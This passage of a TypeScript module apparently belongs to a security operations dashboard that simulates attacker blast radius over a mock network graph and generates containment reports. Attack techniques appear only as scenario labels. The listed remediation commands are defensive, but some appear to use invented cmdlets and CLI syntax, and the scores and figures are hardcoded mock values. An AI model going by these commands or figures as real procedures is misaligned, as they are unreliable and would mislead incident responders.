          remediationAction: 'Enforce Kubernetes CIS benchmark SCA rules and disable automountServiceAccountToken.',
        },
      ],
    },
  ];

  const simulationScenarios: BlastSimulationScenario[] = [
    {
      scenarioId: 'CREDENTIAL_CASCADE',
      title: 'Active Directory Kerberos & Domain Admin Cascade',
      description: 'Simulates the lateral propagation if Domain Controller LSASS credentials or Golden Tickets are leveraged across all joined subnets.',
      attackerObjective: 'Domain dominance, total credential extraction, enterprise ransomware deployment.',
      defaultMitigations: ['Enforce Zero-Trust Microsegmentation', 'Revoke Domain Kerberos Tickets (KRBTGT Reset)'],
    },
    {
      scenarioId: 'RANSOMWARE_WORM',
      title: 'Automated SMB / RPC Subnet Worm Propagation',
      description: 'Simulates rapid lateral spreading via automated EternalBlue / PsExec / WMI worm propagation across internal endpoints.',
      attackerObjective: 'Simultaneous file encryption across workstations, file servers, and backup repositories.',
      defaultMitigations: ['Sever Lateral Ingress Links', 'Quarantine Exploited Subnet VLAN'],
    },
    {
      scenarioId: 'DATA_EXFIL',
      title: 'Crown Jewel Database & Cloud Storage Data Exfiltration Surface',
      description: 'Evaluates the blast reach to critical database clusters and cloud object storage if API gateway or internal service accounts are abused.',
      attackerObjective: 'Bulk extraction of PII, financial ledgers, and trade secrets to external storage.',
      defaultMitigations: ['Block Cloud REST Egress', 'Enforce Database Enclave Microsegmentation'],
    },
    {
      scenarioId: 'ZERO_TRUST_BREACH',
      title: 'DMZ Ingress Boundary Compromise & Lateral Pivoting',
      description: 'Simulates full penetration of DMZ web proxies and evaluates depth of reachable internal network enclaves without zero-trust controls.',
      attackerObjective: 'Pivot from public DMZ directly into internal database tier and core identity providers.',
      defaultMitigations: ['Enforce Zero-Trust Microsegmentation', 'Isolate DMZ Ingress Node'],
    },
  ];

  const criticalPath = [
    'node-ws-fin-104 (Initial Infiltration: Phishing Foothold)',
    'node-dc-primary (LSASS Memory Dump & Domain Admin Escalation)',
    'node-db-vault (Targeted Crown Jewel Vault Asset)',
  ];

  const compromisedCount = nodes.filter((n) => n.compromised).length;
  const quarantinedCount = nodes.filter((n) => n.quarantined).length;
  const activeThreatHops = links.filter((l) => l.threat && l.activeStatus === 'ACTIVE').length;

  return {
    nodes,
    links,
    criticalPath,
    attackPaths,
    activeAttackPathId: 'path-apt-lateral-01',
    simulationScenarios,
    metrics: {
      totalAssets: nodes.length,
      compromisedCount,
      quarantinedCount,
      activeThreatHops,
      overallNetworkRiskScore: 84,
      zeroTrustCoveragePercent: 78.5,
    },
  };
}

export function simulateBlastRadius(
  scenarioId: string,
  originNodeId: string,
  appliedMitigations: string[] = []
): BlastSimulationResult {
  const graph = buildAssetFusionGraph();
  const origin = graph.nodes.find((n) => n.id === originNodeId) || graph.nodes[0];

  // Base reachability simulation
  const hasZeroTrust = appliedMitigations.includes('zero_trust_microsegmentation');
  const hasTokenRevoke = appliedMitigations.includes('revoke_tokens');
  const hasSeverLinks = appliedMitigations.includes('sever_firewall_links');
  const hasQuarantine = appliedMitigations.includes('quarantine_subnet');

  // Traverse links from origin
  const reachableNodeIds = new Set<string>([origin.id]);
  const queue = [origin.id];
  let compromisedHops = 1;

  while (queue.length > 0) {
    const currentId = queue.shift()!;
    const currentNode = graph.nodes.find((n) => n.id === currentId);

    // Find outgoing/connected links
    const relevantLinks = graph.links.filter(
      (l) => (l.source === currentId || l.target === currentId) && l.activeStatus !== 'SEVERED'
    );

    for (const link of relevantLinks) {
      if (hasSeverLinks && link.threat) continue;

      const neighborId = link.source === currentId ? link.target : link.source;
      const neighborNode = graph.nodes.find((n) => n.id === neighborId);

      if (!neighborNode || reachableNodeIds.has(neighborId)) continue;

      // Check zero trust boundary: cannot cross from DMZ/EDGE to INTERNAL/CORE
      if (hasZeroTrust) {
        if ((currentNode?.zone === 'DMZ' || currentNode?.zone === 'EDGE') && neighborNode.zone === 'INTERNAL') {
          continue; // blocked by zero-trust policy
        }
      }

      // Check token revocation: stops Kerberos/LDAP auth escalations
      if (hasTokenRevoke && link.type === 'auth_flow') {
        continue;
      }

      // Check quarantine: isolates the origin completely
      if (hasQuarantine && currentId === origin.id) {
        continue;
      }

      reachableNodeIds.add(neighborId);
      queue.push(neighborId);
      compromisedHops = Math.max(compromisedHops, 2);
    }
  }

  const reachedNodes = graph.nodes.filter((n) => reachableNodeIds.has(n.id));
  const atRiskAssetsCount = reachedNodes.length;

  // Calculate exposure score (0-100)
  let rawExposure = (atRiskAssetsCount / graph.nodes.length) * 100;
  if (scenarioId === 'CREDENTIAL_CASCADE') rawExposure = Math.max(rawExposure, 85);
  if (scenarioId === 'RANSOMWARE_WORM') rawExposure = Math.max(rawExposure, 90);

  // Apply mitigations discount
  let mitigationDeduction = 0;
  if (hasZeroTrust) mitigationDeduction += 35;
  if (hasTokenRevoke) mitigationDeduction += 25;
  if (hasSeverLinks) mitigationDeduction += 20;
  if (hasQuarantine) mitigationDeduction += 30;

  const exposureScore = Math.max(8, Math.min(100, Math.round(rawExposure - mitigationDeduction)));
  const containmentScore = 100 - exposureScore;

  // Calculate financial and record exposure
  const totalValueAtRisk = reachedNodes.reduce((acc, n) => acc + (n.assetValueUSD || 300000), 0);
  const atRiskValueUSD = Math.round(totalValueAtRisk * (exposureScore / 100));
  const atRiskRecordsCount = Math.round(45000 * (exposureScore / 100));

  const recommendedInterventions = [
    {
      action: 'Enforce Zero-Trust Microsegmentation across Internal Enclave',
      priority: 'P1' as const,
      impactReductionPercent: 35,
      command: 'iptables -A FORWARD -s 10.100.8.0/24 -d 10.100.1.5 -p tcp --dport 445 -j DROP',
    },
    {
      action: 'Trigger Enterprise KRBTGT Password Reset & Kerberos TGT Purge',
      priority: 'P1' as const,
      impactReductionPercent: 25,
      command: 'Reset-KdsRootKey -GlobalEnterpriseSync $True && Purge-KerberosTickets -All',
    },
    {
      action: 'Sever Lateral SMB & WinRM Ingress Links via Edge NGFW',
      priority: 'P2' as const,
      impactReductionPercent: 20,
      command: 'palo-alto-cli set security-rule block-lateral-smb action drop source any destination tier-0',
    },
    {
      action: 'Quarantine Host Workstation WS-FIN-104 into Isolated VLAN 999',
      priority: 'P1' as const,
      impactReductionPercent: 30,
      command: 'cecur-agent-cli isolate --agent-id cecur-ag-004 --vlan 999',
    },
  ];

  return {
    scenarioId,
    originNodeId: origin.id,
    exposureScore,
    reachableNodeIds: Array.from(reachableNodeIds),
    compromisedHops,
    atRiskAssetsCount,
    atRiskValueUSD,
    atRiskRecordsCount,
    containmentScore,
    appliedMitigations,
    recommendedInterventions,
  };
}

export function generateThreatExport(
  format: 'json' | 'markdown' | 'executive_summary',
  classification: 'TLP:AMBER' | 'TLP:RED' | 'TLP:GREEN' | 'RESTRICTED' = 'TLP:AMBER',
  notes: string = ''
): ThreatExportReport {
  const graph = buildAssetFusionGraph();
  const blast = simulateBlastRadius('CREDENTIAL_CASCADE', 'node-ws-fin-104', []);

  const report: ThreatExportReport = {
    reportId: `CECUR-THREAT-REPORT-${Date.now().toString(36).toUpperCase()}`,
    title: 'Asset Fusion & Lateral Threat Topology Executive Intelligence Brief',
    generatedAt: new Date().toISOString(),
    classification,
    generatedBy: 'CECUR-IT SOC Tier 2 Automated Defense & Fusion Engine',
    environment: 'Integrated CS3 Production Enclave (US-East / Cloud VPC)',
    summary:
      'High-confidence threat intelligence and lateral topology report. Comprehensive asset fusion reveals 2 active compromised hosts, 3 verified lateral threat vectors, and an active APT LSASS credential extraction chain (INC-2026-0841). Microsegmentation policies and rapid host quarantine are currently containing propagation to the core database cluster.',
    metrics: graph.metrics || {
      totalAssets: graph.nodes.length,
      compromisedCount: 2,
      quarantinedCount: 1,
      activeThreatHops: 3,
      overallNetworkRiskScore: 84,
      zeroTrustCoveragePercent: 78.5,
    },
    attackPathsSummary: (graph.attackPaths || []).map((p) => ({
      id: p.id,
      name: p.name,
      severity: p.severity,
      stepsCount: p.steps.length,
      keyTechnique: p.steps[0]?.mitreTechnique || 'N/A',
    })),
    blastRadiusAnalysis: {
      unmitigatedExposurePercent: 92,
      mitigatedExposurePercent: blast.exposureScore,
      atRiskFinancialValuationUSD: blast.atRiskValueUSD,
      atRiskRecordsCount: blast.atRiskRecordsCount,
    },
    containmentRunbook: [
      {
        step: 1,
        action: 'Quarantine finance workstation WS-FIN-104 (10.100.8.44) into isolation VLAN',
        targetAsset: 'node-ws-fin-104',
        status: 'COMPLETED',
      },
      {
        step: 2,
        action: 'Sever lateral SMB TCP 445 traffic link to Primary Domain Controller',
        targetAsset: 'link-1 (node-ws-fin-104 -> node-dc-primary)',
        status: 'IN_PROGRESS',
      },
      {
        step: 3,
        action: 'Perform emergency KRBTGT double-rotation on corp-ad-dc-primary',
        targetAsset: 'node-dc-primary',
        status: 'PENDING',
      },
      {
        step: 4,
        action: 'Verify PostgreSQL DB Vault cluster isolation and rotate DB service tokens',
        targetAsset: 'node-db-vault',
        status: 'PENDING',
      },
    ],
    nodesSnapshot: graph.nodes,
    linksSnapshot: graph.links,
  };

  return report;
}

